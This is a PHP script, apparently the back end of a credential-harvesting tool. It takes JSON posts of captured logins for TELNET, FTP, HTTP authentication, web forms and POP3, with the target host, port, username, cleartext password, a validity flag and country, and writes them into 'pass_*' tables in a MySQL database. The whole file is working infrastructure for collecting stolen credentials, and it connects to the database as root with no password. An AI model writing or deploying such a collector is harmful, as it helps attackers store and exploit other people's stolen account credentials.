<?php
// Config
$host='localhost';
$user='root';
$pwd='';
$port=3306;
$db='logs';

$json=json_decode(file_get_contents('php://input'), true);

if($json==NULL || !is_array($json)) die('No data found');

if(	!isset($json['Type']) || 
	!isset($json['Date'])||
	!isset($json['Address'])||
	!isset($json['Port'])) 
	die('Bad params');

$con=new mysqli($host,$user,$pwd,$db,$port);

if(mysqli_connect_errno())
	die('ERROR DB');

$insert='';
switch($json['Type'])
{
	case 'TELNET':
	case 'FTP': $insert='INSERT INTO pass_'.strtolower($json['Type']).'(DATE,HOST,PORT,USER_HASH,USER,PASS,VALID,COUNTRY)VALUES(?,?,?,?,?,?,?,?) ON DUPLICATE KEY UPDATE DATE=VALUES(DATE),VALID=VALUES(VALID),COUNTRY=VALUES(COUNTRY)'; break;
	case 'HTTP-AUTH': $insert='INSERT INTO pass_httpauth(DATE,HOST,PORT,HTTP_HOST,HTTP_URL,USER_HASH,USER,PASS,VALID,COUNTRY)VALUES(?,?,?,?,?,?,?,?,?,?) ON DUPLICATE KEY UPDATE DATE=VALUES(DATE),VALID=VALUES(VALID),COUNTRY=VALUES(COUNTRY)'; break;
	case 'GET': 
	case 'POST': 
	case 'GET&POST': 
		$insert='INSERT INTO pass_http(DATE,HOST,PORT,HTTP_HOST,HTTP_URL,USER_HASH,USER,PASS,TYPE,VALID,COUNTRY)VALUES(?,?,?,?,?,?,?,?,?,?,?) ON DUPLICATE KEY UPDATE DATE=VALUES(DATE),VALID=VALUES(VALID),COUNTRY=VALUES(COUNTRY)'; break;
	case 'POP3': $insert='INSERT INTO pass_pop3(DATE,HOST,PORT,USER_HASH,USER,PASS,AUTH_TYPE,VALID,COUNTRY)VALUES(?,?,?,?,?,?,?,?,?) ON DUPLICATE KEY UPDATE DATE=VALUES(DATE),VALID=VALUES(VALID),COUNTRY=VALUES(COUNTRY)'; break;

	default: die('Unkown "'.$json['Type'].'" type');
}

if($stmt= $con->prepare($insert))
{
	$date=isset($json['Date'])?$json['Date']:'';
	$addr=isset($json['Address'])?$json['Address']:'';
	$port=isset($json['Port'])?$json['Port']:'';

	if($json['Type']=='GET' ||$json['Type']=='POST' ||$json['Type']=='GET&POST' )
	{
		$user=isset($json['User'])?json_encode($json['User']):'';
		$pass=isset($json['Password'])?json_encode($json['Password']):'';
	}
	else
	{
		$user=isset($json['User'])?$json['User']:'';
		$pass=isset($json['Password'])?$json['Password']:'';
	}
				
	$user_hash=sha1($user.'\n'.$pass);
	$valid=isset($json['IsValid'])?$json['IsValid']:0;
	$country=isset($json['Country'])?$json['Country']:'';
	$auth_type=isset($json['AuthType'])?$json['AuthType']:'';
	$http_host=isset($json['HttpHost'])?$json['HttpHost']:'';
	$http_url=isset($json['HttpUrl'])?$json['HttpUrl']:'';
	$type=isset($json['Type'])?$json['Type']:'';

	switch($json['Type'])
	{
		case 'TELNET':
		case 'FTP': 
			if(!$stmt->bind_param("ssisssis",$date,$addr,$port,$user_hash,$user,$pass,$valid,$country))
				die('Error');
		break;
		case 'HTTP-AUTH': 
			if(!$stmt->bind_param("ssisssssis",$date,$addr,$port,$http_host,$http_url,$user_hash,$user,$pass,$valid,$country))
				die('Error');
		break;
		case 'GET': 
		case 'POST': 
		case 'GET&POST': 
			if(!$stmt->bind_param("ssissssssis",$date,$addr,$port,$http_host,$http_url,$user_hash,$user,$pass,$type,$valid,$country))
				die('Error');
		break;
		case 'POP3': 
			if(!$stmt->bind_param("ssissssis",$date,$addr,$port,$user_hash,$user,$pass,$auth_type,$valid,$country))
				die('Error');
		break;
	}
	
	if(!$stmt->execute()) die('Error executing'.$stmt->error);
	echo ''.$stmt->affected_rows;
}
$con->close();